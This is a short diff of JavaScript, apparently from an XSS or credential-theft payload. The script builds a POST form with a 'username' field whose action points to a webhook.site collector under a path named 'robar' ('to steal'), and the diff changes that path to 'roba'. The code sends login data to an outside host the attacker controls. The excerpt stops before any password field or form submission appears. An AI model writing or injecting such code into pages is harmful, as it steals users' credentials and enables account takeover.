@@ -1,6 +1,6 @@
 var form = document.createElement('form');
 form.method = 'POST';
-form.action = 'https://webhook.site/2b20713f-1250-4262-abab-4819166aa12a/robar';
+form.action = 'https://webhook.site/2b20713f-1250-4262-abab-4819166aa12a/roba';
 
 var inputUser = document.createElement('input');
 inputUser.name = 'username';
